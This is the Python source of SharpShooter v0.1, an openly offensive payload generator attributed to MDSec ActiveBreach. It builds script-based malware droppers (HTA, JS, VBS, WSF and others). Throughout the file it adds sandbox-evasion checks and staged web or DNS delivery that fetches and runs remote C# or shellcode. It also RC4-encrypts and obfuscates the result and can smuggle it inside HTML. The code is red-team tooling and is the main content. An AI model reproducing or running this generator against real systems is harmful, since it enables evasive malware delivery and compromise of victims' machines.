#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# SharpShooter:
#   Payload Generation with CSharp and DotNetToJScript
# Version:
#   0.1
# Author:
#   Dominic Chell (@domchell), MDSec ActiveBreach (@mdseclabs)

import base64, gzip, io, random, string, sys, cStringIO
from jsmin import jsmin
from modules import *

banner = """
   _____ __                    _____ __                __           
  / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
 ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                     /_/                                            

 \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v0.1\033[0;0m
"""

def read_file(f):
    with open(f,'r') as fs:
        content = fs.read()
    return content

def gzip_str(string_):
    fgz = cStringIO.StringIO()
    gzip_obj = gzip.GzipFile(mode='wb', fileobj=fgz)
    gzip_obj.write(string_)
    gzip_obj.close()
    return fgz

def rc4(key, data):
    S = range(256)
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + ord( key[i % len(key)] )) % 256
        S[i] , S[j] = S[j] , S[i]

    i = j = 0
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

    return ''.join(out)

def run():

    print banner
    template_body=""
    template_base = "templates/sharpshooter."
    shellcode_delivery = False
    shellcode_gzip = ""
    payload_type = 0

    print("\n\033[1;34m[*]\033[0;0m Select the type of payload to generate:")
    print("\033[92m[1]\033[0;0m HTA")
    print("\033[92m[2]\033[0;0m JS")
    print("\033[92m[3]\033[0;0m JSE")
    print("\033[92m[4]\033[0;0m VBA")
    print("\033[92m[5]\033[0;0m VBE")
    print("\033[92m[6]\033[0;0m VBS")
    print("\033[92m[7]\033[0;0m WSF")

    while True:
        payload_type = raw_input("\n\033[1;34m[*]\033[0;0m Enter payload to create\n")
        try:
            payload_type = int(payload_type)
            if (payload_type<1 or payload_type>7):
                raise Exception

            if(payload_type == 1):
                template_body = read_file(template_base + "vbs")
                file_type = "hta"
            elif(payload_type == 2):
                template_body = read_file(template_base + "js")
                file_type = "js"
            elif(payload_type == 3):
                template_body = read_file(template_base + "js")
                file_type = "js"
            elif(payload_type == 4):
                print("\n\033[93m[!]\033[0;0m VBA support is still under development")
                raise Exception
                #template_body = read_file(template_base + "vba")
                #file_type = "vba"
            elif(payload_type == 5):
                template_body = read_file(template_base + "vbs")
                file_type = "vbs"
            elif(payload_type == 6):
                template_body = read_file(template_base + "vbs")
                file_type = "vbs"
            elif(payload_type == 7):
                template_body = read_file(template_base + "js")
                file_type = "wsf"
            break
        except:
            print("\n\033[93m[!]\033[0;0m Incorrect choice")

    print("\n\033[1;34m[*]\033[0;0m The following anti-sandbox techniques are available:")
    print("\033[92m[1]\033[0;0m Key to Domain")
    print("\033[92m[2]\033[0;0m Ensure Domain Joined")
    print("\033[92m[3]\033[0;0m Check for Sandbox Artifacts")
    print("\033[92m[4]\033[0;0m Check for Bad MACs")
    print("\033[92m[5]\033[0;0m Check for Debugging")
    print("\033[92m[0]\033[0;0m Done")

    sandbox_techniques=""
    while True:
        sandboxevasion_type = raw_input("\n\033[1;34m[*]\033[0;0m Insert technique (multiple supported)\n")
        try:
            sandboxevasion_type = int(sandboxevasion_type)

            if (sandboxevasion_type ==  1):
                domain_name = raw_input("\n\033[1;34m[*]\033[0;0m Enter domain (e.g. CONTOSO)\n")
                domain_name=domain_name.strip()
                if not domain_name: raise Exception
                if len(domain_name) <=1:
                    raise Exception
                else:
                    if("js" in file_type):
                        sandbox_techniques+="\to.CheckPlease(0, %s)\n" % domain_name
                    else:
                        sandbox_techniques+="o.CheckPlease 0, %s\n" % domain_name
                    continue
            elif(sandboxevasion_type ==  2):
                if("js" in file_type):
                    sandbox_techniques+="\to.CheckPlease(1,\"foo\")\n"
                else:
                    sandbox_techniques+="o.CheckPlease 1, \"foo\"\n"
                continue
            elif(sandboxevasion_type ==  3):
                if("js" in file_type):
                    sandbox_techniques+="\to.CheckPlease(2,\"foo\")\n"
                else:
                    sandbox_techniques+="o.CheckPlease 2,\"foo\"\n"
                continue
            elif(sandboxevasion_type ==  4):
                if("js" in file_type):
                    sandbox_techniques+="\to.CheckPlease(3,\"foo\")\n"
                else:
                    sandbox_techniques+="o.CheckPlease 3,\"foo\"\n"
                continue
            elif(sandboxevasion_type ==  5):
                if("js" in file_type):
                    sandbox_techniques+="\to.CheckPlease(4,\"foo\")\n"
                else:
                    sandbox_techniques+="o.CheckPlease 4,\"foo\"\n"
                continue
            elif(sandboxevasion_type == 0):
                break

        except:
            print("\n\033[93m[!]\033[0;0m Incorrect choice")

    template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)

    print("\n\033[1;34m[*]\033[0;0m Select the delivery method for the staged payload:")
    print("\033[92m[1]\033[0;0m Web Delivery")
    print("\033[92m[2]\033[0;0m PowerDNS Delivery")
    print("\033[92m[3]\033[0;0m Both")

    while True:
        delivery_method = raw_input("\n\033[1;34m[*]\033[0;0m Select delivery method\n")
        try:
            delivery_method = int(delivery_method)

            shellcode_payload = raw_input("\n\033[1;34m[*]\033[0;0m Do you want to use the builtin shellcode template? Y/N\n")
            shellcode_payload = shellcode_payload.lower()
            if (shellcode_payload == "y" or shellcode_payload == "yes"):
                shellcode_delivery = True
                shellcode_template = read_file("templates/shellcode.cs")
                print("\n\033[1;34m[*]\033[0;0m Provide the shellcode as a byte array (CTRL+D to finish)\n")

                shellcode = []
                try:
                    while True:
                        shellcode.append(raw_input())
                except EOFError:
                    pass
                shellcode = "\n".join(shellcode)

                shellcode_final = shellcode_template.replace("%SHELLCODE%", shellcode)
                shellcode_gzip = gzip_str(shellcode_final)
            else:
                print("\n\033[1;34m[*]\033[0;0m Custom CSharp required\n")
                refs = raw_input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")
                while not refs:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")

                namespace = raw_input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")
                while not namespace:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")

                entrypoint = raw_input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")
                while not entrypoint:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")

            if (shellcode_delivery):
                refs = "mscorlib.dll,System.Windows.Forms.dll"
                namespace = "ShellcodeInjection.Program"
                entrypoint = "Main"

            if(delivery_method == 1):
                stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                while not stager:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")

                if("js" in file_type or "wsf" in file_type):
                    template_code = template_code.replace("%DELIVERY%", "\to.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");" % (refs, namespace, entrypoint, stager))
                else:
                    template_code = template_code.replace("%DELIVERY%", "o.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"" % (refs, namespace, entrypoint, stager))

            if(delivery_method == 2):
                stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                while not stager:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")

                if("js" in file_type or "wsf" in file_type):
                    template_code = template_code.replace("%DELIVERY%", "\to.Go(\"%s\", \"%s\", \"%s\" 2, \"%s\");" % (refs, namespace, entrypoint, stager))
                else:
                    template_code = template_code.replace("%DELIVERY%", "o.Go \"%s\", \"%s\", \"%s\" 2, \"%s\"" % (refs, namespace, entrypoint, stager))

            if(delivery_method == 3):
                stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                while not stager:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")

                if("js" in file_type or "wsf" in file_type):
                    webdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");\n" % (refs, namespace, entrypoint, stager)
                else:
                    webdelivery = "o.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"\n" % (refs, namespace, entrypoint, stager)

                stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                while not stager:
                    raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")

                if("js" in file_type or "wsf" in file_type):
                    dnsdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager)
                else:
                    dnsdelivery = "o.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager)
                
                deliverycode = webdelivery + dnsdelivery
                template_code = template_code.replace("%DELIVERY%", deliverycode)
            break
        except Exception, err:
            print Exception, err
            print("\n\033[93m[!]\033[0;0m Incorrect choice")

    rand_key = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
    key = rand_key(10) 
    payload_encrypted = rc4(key, template_code)
    payload_encoded = base64.b64encode(payload_encrypted)

    if("js" in file_type):
        harness = read_file("templates/harness.js")
        payload = harness.replace("%B64PAYLOAD%", payload_encoded)
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
    elif("wsf" in file_type):
        harness = read_file("templates/harness.wsf")
        payload = harness.replace("%B64PAYLOAD%", payload_encoded)
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
    elif("hta" in file_type):
        harness = read_file("templates/harness.hta")
        payload = harness.replace("%B64PAYLOAD%", payload_encoded)
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
    elif("vba" in file_type):
        harness = read_file("templates/harness.vba")
        payload = harness.replace("%B64PAYLOAD%", payload_encoded)
        payload = payload.replace("%KEY%", "\"%s\"" % (key))
        payload_minified = jsmin(payload)
    else:
        harness = read_file("templates/harness.vbs")
        payload = harness.replace("%B64PAYLOAD%", payload_encoded)
        payload = payload.replace("%KEY%", "\"%s\"" % (key))

    outputfile = raw_input("\n\033[1;34m[*]\033[0;0m Provide name of output file\n")
    while not outputfile:
        raw_input("\n\033[1;34m[*]\033[0;0m Provide name of output file\n")

    if (payload_type == 3):
        file_type = "jse"
    elif (payload_type == 5):
        file_type = "vbe"

    outputfile_payload = outputfile + "." + file_type
    f = open("output/" + outputfile_payload, 'w')
    if("js" in file_type or "hta" in file_type or "wsf" in file_type):
        f.write(payload_minified)
    else:
        f.write(payload)
    f.close()

    print("\033[1;34m[*]\033[0;0m Written delivery payload to output/%s" % outputfile_payload)
    if shellcode_delivery:
        outputfile_shellcode = outputfile + ".payload"
        with open("output/" + outputfile_shellcode, 'w') as f:
            gzip_encoded = base64.b64encode(shellcode_gzip.getvalue())
            f.write(gzip_encoded)
            f.close()
            print("\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s" % outputfile_shellcode)

    if not "vba" in file_type:
        smuggle = raw_input("\n\033[1;34m[*]\033[0;0m Do you want to smuggle inside HTML?\n").lower()
        if (smuggle == "y" or smuggle == "yes"):
            rand_key = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
            key = rand_key(10)
            embedinhtml.run_embedInHtml(key, "./output/"+outputfile_payload, "./output/"+outputfile+".html")

run()